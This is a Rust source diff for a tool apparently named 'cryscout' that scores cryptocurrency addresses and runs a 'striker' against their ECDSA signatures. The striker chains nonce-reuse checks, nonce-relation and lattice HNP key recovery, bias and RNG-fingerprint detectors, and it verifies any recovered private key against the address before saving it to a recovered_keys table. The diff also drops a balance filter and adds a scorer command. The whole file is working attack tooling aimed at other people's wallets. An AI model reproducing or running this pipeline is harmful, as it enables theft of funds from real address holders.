@@ -17,6 +17,7 @@ use ndarray::Array2;
 use std::path::Path;
 
 const DB_FILE: &str = "cryscout.db";
+const MIN_SIGNATURES_FOR_SCORING: usize = 2;
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -59,9 +60,31 @@ async fn run_scorer(state: &mut WorkerState) -> Result<()> {
     state.log("Ranking all addresses based on unified scoring system...");
     let conn = Connection::open(DB_FILE)?;
     conn.pragma_update(None, "busy_timeout", &30000)?;
-    
-    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND balance >= 20.0")?;
-    let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
+
+    conn.execute(
+        "UPDATE addresses
+         SET vulnerability_score = 0,
+             potential_weakness = 'Insufficient signature data',
+             rank = NULL
+         WHERE address NOT IN (
+             SELECT address
+             FROM signatures
+             GROUP BY address
+             HAVING COUNT(*) >= ?1
+         )",
+        params![MIN_SIGNATURES_FOR_SCORING as i64],
+    )?;
+
+    let mut stmt = conn.prepare(
+        "SELECT address
+         FROM signatures
+         GROUP BY address
+         HAVING COUNT(*) >= ?1"
+    )?;
+    let addresses: Vec<String> = stmt
+        .query_map(params![MIN_SIGNATURES_FOR_SCORING as i64], |row| row.get(0))?
+        .flatten()
+        .collect();
     
     state.log(&format!("Processing {} candidates...", addresses.len()));
 
@@ -166,7 +189,6 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
                  WHERE (a.sigs_scanned = 0 OR a.sigs_scanned IS NULL)
                    AND (a.processing_by IS NULL OR a.processing_since < datetime('now', '-1 hour'))
                    AND a.vulnerability_score > 0
-                   AND a.balance >= 20.0
                  GROUP BY a.address HAVING COUNT(s.id) >= 2 
                  ORDER BY a.rank ASC 
                  LIMIT 10"
@@ -190,187 +212,217 @@ async fn run_striker(state: &mut WorkerState) -> Result<bool> {
 
     for (addr, _bal, count, pubkey, score) in targets {
         state.log(&format!("LAUNCHING PRECISION STRIKE: {} (Score: {:.3}, {} sigs)", addr, score, count));
-        
-        let mut sig_stmt = conn.prepare("SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?;
-        let sigs_for_json: Vec<Value> = sig_stmt.query_map(params![&addr], |r| {
-            Ok(serde_json::json!({ "r": r.get::<_, String>(0)?, "s": r.get::<_, String>(1)?, "z": r.get::<_, String>(2)? }))
-        })?.collect::<rusqlite::Result<Vec<_>>>()?;
+        let strike_result: Result<()> = async {
+            let mut sig_stmt = conn.prepare("SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?;
+            let sigs_for_json: Vec<Value> = sig_stmt.query_map(params![&addr], |r| {
+                Ok(serde_json::json!({ "r": r.get::<_, String>(0)?, "s": r.get::<_, String>(1)?, "z": r.get::<_, String>(2)? }))
+            })?.collect::<rusqlite::Result<Vec<_>>>()?;
 
-        let sigs_for_features: Vec<BigInt> = conn.prepare("SELECT DISTINCT r_int FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?
-            .query_map(params![&addr], |r| r.get::<_, String>(0))?
-            .collect::<rusqlite::Result<Vec<String>>>()?
-            .into_iter()
-            .map(|s| BigInt::from_str_radix(&s, 10).unwrap_or_default())
-            .collect();
-        
-        let sigs_file = format!("temp_sigs_{}.json", addr);
-        let _ = std::fs::write(&sigs_file, serde_json::to_string(&sigs_for_json)?);
+            let sigs_for_features: Vec<BigInt> = conn.prepare("SELECT DISTINCT r_int FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?
+                .query_map(params![&addr], |r| r.get::<_, String>(0))?
+                .collect::<rusqlite::Result<Vec<String>>>()?
+                .into_iter()
+                .map(|s| BigInt::from_str_radix(&s, 10).unwrap_or_default())
+                .collect();
 
-        // --- Step 0: Fast R-REUSE Check ---
-        state.log("  [0/6] Checking for Nonce Reuse (R-Reuse)...");
-        for i in 0..sigs_for_json.len() {
-            for j in (i+1)..sigs_for_json.len() {
-                let r1 = sigs_for_json[i]["r"].as_str().unwrap_or("");
-                let r2 = sigs_for_json[j]["r"].as_str().unwrap_or("");
-                let s1 = sigs_for_json[i]["s"].as_str().unwrap_or("");
-                let s2 = sigs_for_json[j]["s"].as_str().unwrap_or("");
-                let z1 = sigs_for_json[i]["z"].as_str().unwrap_or("");
-                let z2 = sigs_for_json[j]["z"].as_str().unwrap_or("");
+            let sigs_file = format!("temp_sigs_{}.json", addr);
+            std::fs::write(&sigs_file, serde_json::to_string(&sigs_for_json)?)?;
 
-                if r1 == r2 && s1 != s2 && !r1.is_empty() {
-                    state.log(&format!("  [!!!] R-REUSE DETECTED for {}!", addr));
-                    let _ = conn.execute(
-                        "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
-                        params![addr, "Nonce Reuse", "CRITICAL", "Identical R values with different S/Z found. Recovery imminent."],
-                    );
-                }
-            }
-        }
+            let result = async {
+                state.log("  [0/6] Checking for Nonce Reuse (R-Reuse)...");
+                for i in 0..sigs_for_json.len() {
+                    for j in (i + 1)..sigs_for_json.len() {
+                        let r1 = sigs_for_json[i]["r"].as_str().unwrap_or("");
+                        let r2 = sigs_for_json[j]["r"].as_str().unwrap_or("");
+                        let s1 = sigs_for_json[i]["s"].as_str().unwrap_or("");
+                        let s2 = sigs_for_json[j]["s"].as_str().unwrap_or("");
 
-        state.log("  [1/6] Nonce Relation Attack...");
-        if let Ok(Ok(out1)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/nonce_relation_rs").arg("--sigs").arg(&sigs_file).arg("--pubkey").arg(&pubkey).output()).await {
-            let stdout = String::from_utf8_lossy(&out1.stdout);
-            if stdout.contains("SUCCESS") { 
-                if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key:")) {
-                    let privkey = key_line.split("Private Key:").last().unwrap_or("").trim().trim_start_matches("0x");
-                    if let Ok(d_bytes) = hex::decode(privkey) {
-                        if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
-                            let vk = sk.verifying_key();
-                            let mut match_found = false;
-                            for compressed in [true, false] {
-                                let encoded = vk.to_encoded_point(compressed);
-                                let pubkey_bytes = encoded.as_bytes();
-                                let mut sha256 = sha2::Sha256::new();
-                                sha256.update(pubkey_bytes);
-                                let sha256_hash = sha256.finalize();
-                                let mut ripemd160 = ripemd::Ripemd160::new();
-                                ripemd160.update(&sha256_hash);
-                                let h160 = ripemd160.finalize();
-                                if let Ok(decoded) = bs58::decode(&addr).into_vec() {
-                                    if decoded.len() == 25 && decoded[1..21] == h160[..] {
-                                        match_found = true;
-                                        break;
-                                    }
-                                }
-                            }
-                            if match_found {
-                                state.log(&format!("  [!!!] VERIFIED SUCCESS: Nonce Relation found key for {}!", addr));
-                                conn.execute(
-                                    "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
-                                    params![addr, format!("0x{}", privkey), "Nonce Relation"],
-                                )?;
-                            } else {
-                                state.log(&format!("  [!] REJECTED: Nonce Relation found key for {} but it did not match address!", addr));
-                            }
+                        if r1 == r2 && s1 != s2 && !r1.is_empty() {
+                            state.log(&format!("  [!!!] R-REUSE DETECTED for {}!", addr));
+                            let _ = conn.execute(
+                                "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
+                                params![addr, "Nonce Reuse", "CRITICAL", "Identical R values with different S/Z found. Recovery imminent."],
+                            );
                         }
                     }
                 }
-            }
-        } else { state.log("  [!] Nonce Relation Attack timed out."); }
 
-        state.log("  [2/5] Spectral Bias Detection (FFT)...");
-        if let Ok(Ok(out2)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bias_detector_rs").arg(&addr).output()).await {
-            let stdout = String::from_utf8_lossy(&out2.stdout);
-            if stdout.contains("Potential Bias") { 
-                state.log(&format!("  [!] BIAS DETECTED for {}: Spectral peak identified.", addr)); 
-                let _ = conn.execute(
-                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
-                    params![addr, "Spectral Bias", "High", "Peak frequency detected in nonce distribution"],
-                );
-            }
-        } else { state.log("  [!] Spectral Bias Detection timed out."); }
-
-        state.log("  [3/5] Lattice HNP (LLL)...");
-        if let Ok(Ok(out3)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/lattice_attack_rs").arg(&sigs_file).arg(&addr).arg("8").output()).await {
-            let stdout = String::from_utf8_lossy(&out3.stdout);
-            if stdout.contains("SUCCESS") { 
-                if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key Found:")) {
-                    let privkey = key_line.split("Found:").last().unwrap_or("").trim().trim_start_matches("0x");
-                    if let Ok(d_bytes) = hex::decode(privkey) {
-                        if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
-                            let vk = sk.verifying_key();
-                            let mut match_found = false;
-                            for compressed in [true, false] {
-                                let encoded = vk.to_encoded_point(compressed);
-                                let pubkey_bytes = encoded.as_bytes();
-                                let mut sha256 = sha2::Sha256::new();
-                                sha256.update(pubkey_bytes);
-                                let sha256_hash = sha256.finalize();
-                                let mut ripemd160 = ripemd::Ripemd160::new();
-                                ripemd160.update(&sha256_hash);
-                                let h160 = ripemd160.finalize();
-                                if let Ok(decoded) = bs58::decode(&addr).into_vec() {
-                                    if decoded.len() == 25 && decoded[1..21] == h160[..] {
-                                        match_found = true;
-                                        break;
+                state.log("  [1/6] Nonce Relation Attack...");
+                if let Ok(Ok(out1)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/nonce_relation_rs").arg("--sigs").arg(&sigs_file).arg("--pubkey").arg(&pubkey).output()).await {
+                    let stdout = String::from_utf8_lossy(&out1.stdout);
+                    if stdout.contains("SUCCESS") {
+                        if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key:")) {
+                            let privkey = key_line.split("Private Key:").last().unwrap_or("").trim().trim_start_matches("0x");
+                            if let Ok(d_bytes) = hex::decode(privkey) {
+                                if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
+                                    let vk = sk.verifying_key();
+                                    let mut match_found = false;
+                                    for compressed in [true, false] {
+                                        let encoded = vk.to_encoded_point(compressed);
+                                        let pubkey_bytes = encoded.as_bytes();
+                                        let mut sha256 = sha2::Sha256::new();
+                                        sha256.update(pubkey_bytes);
+                                        let sha256_hash = sha256.finalize();
+                                        let mut ripemd160 = ripemd::Ripemd160::new();
+                                        ripemd160.update(&sha256_hash);
+                                        let h160 = ripemd160.finalize();
+                                        if let Ok(decoded) = bs58::decode(&addr).into_vec() {
+                                            if decoded.len() == 25 && decoded[1..21] == h160[..] {
+                                                match_found = true;
+                                                break;
+                                            }
+                                        }
                                     }
+                                    if match_found {
+                                        state.log(&format!("  [!!!] VERIFIED SUCCESS: Found key for {}!", addr));
+                                        conn.execute(
+                                            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
+                                            params![addr, format!("0x{}", privkey), "Strike Method"],
+                                        )?;
+                                    } else {
+                                        state.log(&format!("  [!] REJECTED: Found key 0x{} for {} but it did not match address!", privkey, addr));
+                                    }
+
                                 }
-                            }
-                            if match_found {
-                                state.log(&format!("  [!!!] VERIFIED CRITICAL SUCCESS: Lattice Reduction recovered key for {}!", addr));
-                                conn.execute(
-                                    "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
-                                    params![addr, format!("0x{}", privkey), "Lattice HNP"],
-                                )?;
-                            } else {
-                                state.log(&format!("  [!] REJECTED: Lattice HNP found key for {} but it did it not match address!", addr));
                             }
                         }
                     }
+                } else {
+                    state.log("  [!] Nonce Relation Attack timed out.");
                 }
-            }
-        } else { state.log("  [!] Lattice HNP Attack timed out."); }
 
-        state.log("  [4/6] Physics Engine RNG Fingerprinting...");
-        if let Ok(Ok(out_chaos)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/physics_engine_rs").arg(&sigs_file).output()).await {
-            let stdout = String::from_utf8_lossy(&out_chaos.stdout);
-            if stdout.contains("POTENTIAL RNG VULNERABILITY DETECTED") { 
-                state.log(&format!("  [!] RNG FINGERPRINT VULNERABILITY DETECTED for {}.", addr)); 
-                let reasons: Vec<&str> = stdout.lines().filter(|l| l.starts_with("- ")).collect();
-                let details = if reasons.is_empty() { "Multiple RNG anomalies detected".to_string() } else { reasons.join("; ") };
-                let _ = conn.execute(
-                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
-                    params![addr, "RNG Fingerprint", "High", details],
-                );
-            }
-        } else { state.log("  [!] Physics Engine Scan timed out."); }
-
-        state.log("  [5/6] Bleichenbacher Fourier Analysis...");
-        if let Ok(Ok(out4)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bleichenbacher_fourier").arg(&sigs_file).output()).await {
-            let stdout = String::from_utf8_lossy(&out4.stdout);
-            if stdout.contains("POTENTIAL HIT") { 
-                state.log(&format!("  [!] BLEICHENBACHER-STYLE BIAS DETECTED for {}.", addr)); 
-                let _ = conn.execute(
-                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
-                    params![addr, "Fourier Bias", "High", "Bleichenbacher-style periodicity detected"],
-                );
-            }
-        } else { state.log("  [!] Bleichenbacher Fourier Analysis timed out."); }
-
-        state.log("  [6/6] Neural Anomaly Detection (Real ONNX Model)...");
-        if sigs_for_features.len() < 2 {
-            state.log("    Skipping neural inference: Insufficient unique nonces for statistical analysis.");
-        } else {
-            match run_neural_inference(state, &sigs_for_features).await {
-                Ok(prob) => {
-                    state.log(&format!("    P(vulnerable) from model: {:.4}", prob));
-                    if prob > 0.8 {
-                        state.log(&format!("    [!!!] NEURAL ANOMALY DETECTED for {}: High non-randomness probability.", addr));
+                state.log("  [2/5] Spectral Bias Detection (FFT)...");
+                if let Ok(Ok(out2)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bias_detector_rs").arg(&addr).output()).await {
+                    let stdout = String::from_utf8_lossy(&out2.stdout);
+                    if stdout.contains("Potential Bias") {
+                        state.log(&format!("  [!] BIAS DETECTED for {}: Spectral peak identified.", addr));
                         let _ = conn.execute(
                             "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
-                            params![addr, "Neural Anomaly", "High", format!("P(vulnerable)={:.4}", prob)],
+                            params![addr, "Spectral Bias", "High", "Peak frequency detected in nonce distribution"],
                         );
                     }
+                } else {
+                    state.log("  [!] Spectral Bias Detection timed out.");
                 }
-                Err(e) => state.log(&format!("    Neural inference error: {}", e)),
+
+                state.log("  [3/5] Lattice HNP (LLL)...");
+                if let Ok(Ok(out3)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/lattice_attack_rs").arg(&sigs_file).arg(&addr).arg("8").output()).await {
+                    let stdout = String::from_utf8_lossy(&out3.stdout);
+                    if stdout.contains("SUCCESS") {
+                        if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key Found:")) {
+                            let privkey = key_line.split("Found:").last().unwrap_or("").trim().trim_start_matches("0x");
+                            if let Ok(d_bytes) = hex::decode(privkey) {
+                                if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
+                                    let vk = sk.verifying_key();
+                                    let mut match_found = false;
+                                    for compressed in [true, false] {
+                                        let encoded = vk.to_encoded_point(compressed);
+                                        let pubkey_bytes = encoded.as_bytes();
+                                        let mut sha256 = sha2::Sha256::new();
+                                        sha256.update(pubkey_bytes);
+                                        let sha256_hash = sha256.finalize();
+                                        let mut ripemd160 = ripemd::Ripemd160::new();
+                                        ripemd160.update(&sha256_hash);
+                                        let h160 = ripemd160.finalize();
+                                        if let Ok(decoded) = bs58::decode(&addr).into_vec() {
+                                            if decoded.len() == 25 && decoded[1..21] == h160[..] {
+                                                match_found = true;
+                                                break;
+                                            }
+                                        }
+                                    }
+                                    if match_found {
+                                        state.log(&format!("  [!!!] VERIFIED SUCCESS: Found key for {}!", addr));
+                                        conn.execute(
+                                            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
+                                            params![addr, format!("0x{}", privkey), "Strike Method"],
+                                        )?;
+                                    } else {
+                                        state.log(&format!("  [!] REJECTED: Found key 0x{} for {} but it did not match address!", privkey, addr));
+                                    }
+
+                                }
+                            }
+                        }
+                    }
+                } else {
+                    state.log("  [!] Lattice HNP Attack timed out.");
+                }
+
+                state.log("  [4/6] Physics Engine RNG Fingerprinting...");
+                if let Ok(Ok(out_chaos)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/physics_engine_rs").arg(&sigs_file).output()).await {
+                    let stdout = String::from_utf8_lossy(&out_chaos.stdout);
+                    if stdout.contains("POTENTIAL RNG VULNERABILITY DETECTED") {
+                        state.log(&format!("  [!] RNG FINGERPRINT VULNERABILITY DETECTED for {}.", addr));
+                        let reasons: Vec<&str> = stdout.lines().filter(|l| l.starts_with("- ")).collect();
+                        let details = if reasons.is_empty() { "Multiple RNG anomalies detected".to_string() } else { reasons.join("; ") };
+                        let _ = conn.execute(
+                            "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
+                            params![addr, "RNG Fingerprint", "High", details],
+                        );
+                    }
+                } else {
+                    state.log("  [!] Physics Engine Scan timed out.");
+                }
+
+                state.log("  [5/6] Bleichenbacher Fourier Analysis...");
+                if let Ok(Ok(out4)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bleichenbacher_fourier").arg(&sigs_file).output()).await {
+                    let stdout = String::from_utf8_lossy(&out4.stdout);
+                    if stdout.contains("POTENTIAL HIT") {
+                        state.log(&format!("  [!] BLEICHENBACHER-STYLE BIAS DETECTED for {}.", addr));
+                        let _ = conn.execute(
+                            "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
+                            params![addr, "Fourier Bias", "High", "Bleichenbacher-style periodicity detected"],
+                        );
+                    }
+                } else {
+                    state.log("  [!] Bleichenbacher Fourier Analysis timed out.");
+                }
+
+                state.log("  [6/6] Neural Anomaly Detection (Real ONNX Model)...");
+                if sigs_for_features.len() < 2 {
+                    state.log("    Skipping neural inference: Insufficient unique nonces for statistical analysis.");
+                } else {
+                    match run_neural_inference(state, &sigs_for_features).await {
+                        Ok(prob) => {
+                            state.log(&format!("    P(vulnerable) from model: {:.4}", prob));
+                            if prob > 0.8 {
+                                state.log(&format!("    [!!!] NEURAL ANOMALY DETECTED for {}: High non-randomness probability.", addr));
+                                let _ = conn.execute(
+                                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
+                                    params![addr, "Neural Anomaly", "High", format!("P(vulnerable)={:.4}", prob)],
+                                );
+                            }
+                        }
+                        Err(e) => state.log(&format!("    Neural inference error: {}", e)),
+                    }
+                }
+
+                Ok(())
+            }
+            .await;
+
+            let _ = std::fs::remove_file(&sigs_file);
+            result
+        }
+        .await;
+
+        match strike_result {
+            Ok(()) => {
+                conn.execute(
+                    "UPDATE addresses SET sigs_scanned = 1, processing_by = NULL, processing_since = NULL WHERE address = ?1",
+                    params![&addr],
+                )?;
+                state.log(&format!("  [-] Strike sequence concluded for {}. Marked as scanned.", addr));
+            }
+            Err(e) => {
+                let _ = conn.execute(
+                    "UPDATE addresses SET processing_by = NULL, processing_since = NULL WHERE address = ?1",
+                    params![&addr],
+                );
+                state.log(&format!("  [!] Strike sequence failed for {}: {}", addr, e));
             }
         }
-
-        let _ = std::fs::remove_file(&sigs_file);
-        
-        // Mark as scanned
-        conn.execute("UPDATE addresses SET sigs_scanned = 1, processing_by = NULL WHERE address = ?1", params![&addr])?;
-        state.log(&format!("  [-] Strike sequence concluded for {}. Marked as scanned.", addr));
     }
     Ok(true)
 }
@@ -397,11 +449,22 @@ async fn run_scanner(state: &mut WorkerState) -> Result<()> {
     Ok(())
 }
 async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
-    let mut conn = Connection::open(DB_FILE)?;
+    let conn = Connection::open(DB_FILE)?;
     conn.pragma_update(None, "busy_timeout", &30000)?;
-    
-    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE sigs_fetched = 1 AND (sigs_scanned = 0 OR sigs_scanned IS NULL) AND balance >= 20.0 LIMIT 20")?;
-    let addresses: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
+
+    let mut stmt = conn.prepare(
+        "SELECT a.address
+         FROM addresses a
+         JOIN signatures s ON a.address = s.address
+         WHERE (a.sigs_scanned = 0 OR a.sigs_scanned IS NULL)
+         GROUP BY a.address
+         HAVING COUNT(s.id) >= ?1
+         LIMIT 20"
+    )?;
+    let addresses: Vec<String> = stmt
+        .query_map(params![MIN_SIGNATURES_FOR_SCORING as i64], |row| row.get(0))?
+        .flatten()
+        .collect();
     
     if addresses.is_empty() {
         return Ok(());
@@ -425,6 +488,32 @@ async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
 
         if sigs.is_empty() {
             state.log(&format!("Analyzer: No signatures in DB for {}", addr));
+            conn.execute(
+                "UPDATE addresses
+                 SET sigs_fetched = 0,
+                     vulnerability_score = 0,
+                     potential_weakness = 'Insufficient signature data',
+                     rank = NULL
+                 WHERE address = ?1",
+                params![&addr],
+            )?;
+            continue;
+        }
+
+        if sigs.len() < MIN_SIGNATURES_FOR_SCORING {
+            state.log(&format!(
+                "Analyzer: Only {} signature(s) available for {}. Clearing score until more evidence exists.",
+                sigs.len(),
+                addr
+            ));
+            conn.execute(
+                "UPDATE addresses
+                 SET vulnerability_score = 0,
+                     potential_weakness = 'Insufficient signature data',
+                     rank = NULL
+                 WHERE address = ?1",
+                params![&addr],
+            )?;
             continue;
         }
 
@@ -517,6 +606,7 @@ async fn main() -> Result<()> {
         match cli.command {
             Commands::Scanner => { let _ = run_scanner(&mut state).await; }
             Commands::Analyzer => { let _ = run_analyzer(&mut state).await; }
+        Commands::Scorer => { let _ = run_scorer(&mut state).await; }
             Commands::Striker => { 
                 match run_striker(&mut state).await {
                     Ok(found) => {
